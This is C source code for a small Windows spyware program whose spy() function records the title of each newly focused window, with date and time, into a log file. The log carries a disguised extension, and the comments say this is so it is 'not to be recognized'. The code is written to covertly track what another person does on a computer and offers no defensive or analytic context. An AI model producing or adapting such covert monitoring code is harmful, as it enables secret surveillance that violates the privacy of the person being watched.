    #include<windows.h>
    #include<stdio.h>
    #include<time.h>
    char hac[256], cmp[256];
    char dateStr[9];
    char timeStr[9];
    HWND fore1, fore2, fore3;
    int i, j, k;
    void spy() {
      FILE * fore;
      fore = fopen("winlog.txm", "a+");
      /*different format to not to be recognized
                 and when you want to read the log just rename it*/
      fore1 = GetForegroundWindow();
      GetWindowText(fore1, hac, sizeof(hac));
      i = strcmp(hac, cmp); //if he's on same window dont log again

      if (i == 0) {
        fclose(fore);
      } else {
        _strdate(dateStr); //function to get date
        _strtime(timeStr); //guess it
        fprintf(fore, "\n%s\t%s\t%s\t", hac, dateStr, timeStr);
        strcpy(cmp, hac);
        fclose(fore);
      }
    }

    int main() {
      while (1) {
        Sleep(900);
        spy();
      }
    }
